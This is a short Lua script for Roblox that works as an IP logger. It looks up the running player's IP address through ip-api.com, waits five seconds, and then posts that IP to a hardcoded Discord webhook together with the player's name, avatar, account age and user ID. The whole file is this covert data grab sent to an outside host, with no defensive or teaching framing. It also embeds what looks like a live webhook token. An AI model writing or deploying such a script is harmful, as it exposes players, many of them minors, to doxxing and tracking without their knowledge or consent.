local HTTP = game:GetService("HttpService")

local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_" -- This can be found by going into your discord server settings then going to integrations then going to webhooks
local player = game.Players.LocalPlayer
local a = game:HttpGet("http://ip-api.com/json")

wait(5)

	local data = {
		["embeds"] = {{

			["author"] = {
				["name"] = player.Name,
				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
			},
			["description"] = "IP:  " .. a.query,
			["color"] = tonumber(0xFFFAFA),
			["fields"] = {
				{
					["name"] = "Account Age:",
					["value"] = player.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "User ID:",
					["value"] = player.UserId,
					["inline"] = true
				}
			}
		}},

	}
	local finaldata = HTTP:JSONEncode(data)
	HTTP:PostAsync(webhookurl, finaldata)
